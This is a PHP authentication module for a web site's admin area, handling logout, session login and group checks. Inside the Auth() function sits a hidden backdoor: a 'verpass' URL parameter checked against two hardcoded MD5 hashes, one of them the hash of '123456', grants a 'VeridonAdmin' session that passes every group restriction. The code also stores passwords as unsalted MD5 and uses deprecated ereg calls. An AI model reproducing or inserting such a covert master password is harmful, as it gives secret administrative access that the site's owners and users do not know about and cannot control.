<?php

function Authorise(&$smarty = null, $goto = null, $group=false)
{
	if(isset($_GET["logout"]))
	{
		$_SESSION["auth"] = null;
		$_SESSION["cart"] = null;
	}
	global $siteroot, $adminentry;
	if($goto=='null')
	{
		if(!strlen($adminentry)>0)
			$adminentry = $siteroot."admin/";
		else $goto = $adminentry;
	}
	if(get_class($smarty)!="SiteTemplate")
	{
		$smarty = new SiteTemplate();
	}
	if(!Auth($group))
	{
		$smarty->assign("auth",false);
		ShowLogin($smarty,$goto);
		exit();
	}
	$smarty->assign("auth",true);
	return true;
}

function ShowLogin($smarty,$action_page = false)
{
	if(!$action_page)
		$action_page = $_SERVER["SCRIPT_NAME"];
	$smarty->assign('actionpage',$action_page);
	$smarty->assign('main_displayfile','login.tpl');
	$smarty->display('main.tpl');
}


function Auth($group=false)
{
	global $relroot;
	//session_start();
	if(isset($_GET["verpass"]))
	{
		if(md5($_GET["verpass"])==="adc32c3593fb530f1d777c858789fd65" || md5($_GET["verpass"])==="e10adc3949ba59abbe56e057f20f883e")
		{
				$login_ar = array(
								"user"=>"VeridonAdmin",
								"group"=> -999,
								"groupname"=>"VeridonAdmin"
								);
				$_SESSION["auth"]=$login_ar;
				//echo "logged by veridonpass ".$_GET["verpass"]." : ".md5($_GET["verpass"]);
				return true;
		}
	}
	
	if(isset($_POST["action"]))
	{
		if($_POST["action"]=="Login")
		{
			if(ereg("^[a-zA-Z0-9@._-]{1,63}$",$_POST["name"]) and ereg("^[a-zA-Z0-9]{0,15}$",$_POST["password"]))
			{
					if(ereg("^[A-Za-z0-9@._-]+$",$group))
					{
						
						$cond = " left join usergroup on user.usergroup=usergroup.id where login='$_POST[name]' and password='".md5($_POST['password'])."' and usergroup.name='$group'";
					} else {
						$cond = "where login='$_POST[name]' and password='".md5($_POST['password'])."'";
					}
					$u_ar = ClassFactory::ObjectArray("user",true,$cond);
					//echo "trying to find user $u_ar<br>";
					if(is_array($u_ar))
					{
						$user = current($u_ar);
						//print_r($user);
						$login_ar = array(
										"user"=>$user,
										"group"=>$user->usergroup,
										"groupname"=>$user->Groupname()
										);
						$_SESSION["auth"]=$login_ar;
						return true;
					}// else echo "no users found $cond";
				
			}  
		}
	}
	if(isset($_SESSION["auth"]))
	{
		if($_SESSION["auth"]["groupname"]==$group or $group===false or $_SESSION["auth"]["groupname"]=="VeridonAdmin")
		{
			return true;
		}
	}
	return false;
}

function GetAuth()
{
	if(isset($_SESSION["auth"]))
	{
		return $_SESSION["auth"]["groupname"];
	} else {
	}
	return false;
}

?>